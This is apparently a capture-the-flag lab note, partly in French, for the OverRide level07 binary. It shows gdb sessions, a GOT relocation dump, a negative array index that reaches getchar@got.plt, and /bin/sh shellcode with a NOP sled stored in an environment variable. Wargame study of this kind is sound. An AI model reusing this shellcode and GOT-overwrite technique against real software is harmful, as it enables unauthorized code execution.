<pre>
level07@OverRide:~$ gdb ./level07 

(gdb) b \*0x080486cb
Breakpoint 1 at 0x80486cb
(gdb) r
Starting program: /home/users/level07/level07 
\----------------------------------------------------
  Welcome to wil's crappy number storage service!   
\----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
\----------------------------------------------------
   wil has reserved some storage :>                 
\----------------------------------------------------

Input command: store 
 Number: 999
 Index: 1

Breakpoint 1, 0x080486cb in store\_number ()
(gdb) x $eax
0xffffd458:     0x00000000
</pre>

<pre>
objdump -R ./level07 

./level07:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R\_386\_GLOB\_DAT    \_\_gmon\_start\_\_
0804a040 R\_386\_COPY        stdin@@GLIBC\_2.0
0804a060 R\_386\_COPY        stdout@@GLIBC\_2.0
0804a000 R\_386\_JUMP\_SLOT   printf@GLIBC\_2.0
0804a004 R\_386\_JUMP\_SLOT   fflush@GLIBC\_2.0
0804a008 R\_386\_JUMP\_SLOT   getchar@GLIBC\_2.0
0804a00c R\_386\_JUMP\_SLOT   fgets@GLIBC\_2.0
0804a010 R\_386\_JUMP\_SLOT   \_\_stack\_chk\_fail@GLIBC\_2.4
0804a014 R\_386\_JUMP\_SLOT   puts@GLIBC\_2.0
0804a018 R\_386\_JUMP\_SLOT   \_\_gmon\_start\_\_
0804a01c R\_386\_JUMP\_SLOT   \_\_libc\_start\_main@GLIBC\_2.0
0804a020 R\_386\_JUMP\_SLOT   memset@GLIBC\_2.0
0804a024 R\_386\_JUMP\_SLOT   \_\_isoc99\_scanf@GLIBC\_2.7
</pre>

<pre>
(gdb) r
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 123
 Index: -1040108819

Breakpoint 1, 0x080486cb in store\_number ()
(gdb) x $eax
0x804a008 <getchar@got.plt>:    0xf7e94840
</pre>

<pre>
level07@OverRide:~$ env -i SC=$(python -c "print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')") SHELL=/bin/bash gdb ./level07 

(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) x/10s \*\*(char\*\*\*)&environ
0xffffdf7e:      "SHELL=/bin/bash"
0xffffdf8e:      "COLUMNS=120"
0xffffdf9a:      "PWD=/home/users/level07"
0xffffdfb2:      "LINES=49"
0xffffdfbb:      "SC=1\311\367\341Qh//shh/bin\211\343\260\v\315\200"
0xffffdfd4:      "SHLVL=0"
0xffffdfdc:      "/home/users/level07/level07"
0xffffdff8:      ""
0xffffdff9:      ""
0xffffdffa:      ""
(gdb) x 0xffffdfbb + 3
0xffffdfbe:      "1\311\367\341Qh//shh/bin\211\343\260\v\315\200"
</pre>

```
env -i SC=$(python -c "print('\x90' * 20  + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')") SHELL=/bin/bash
```

- Se qui est dans l'environnement et dans les arguments est supprimé

<pre>
(gdb)  b *0x08048887
Breakpoint 1 at 0x8048887
(gdb) b *0x80486cb
Breakpoint 2 at 0x80486cb
(gdb) r
Starting program: /home/users/level07/level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048887 in main ()
(gdb) x $eax
0xffffd5e8:     0x726f7473  # retou de fgets
(gdb) c
Continuing.
 Number: 123
 Index: 1

Breakpoint 2, 0x080486cb in store_number ()
(gdb) x $eax
0xffffd458:     0x00000000 # index 1 du tableau

Input command: store
 Number: 1
 Index: -2

Breakpoint 2, 0x080486cb in store_number ()
(gdb) x $eax
0xffffd44c:     0xffffd6b8 # index -2 du tableau
</pre>

- 0xffffd5e8 - 0xffffd458 = 0x190 = 400
- ffffd5e8 - ffffd44c = 19c = 412
- ffffd608 - 19c = ffffd46c
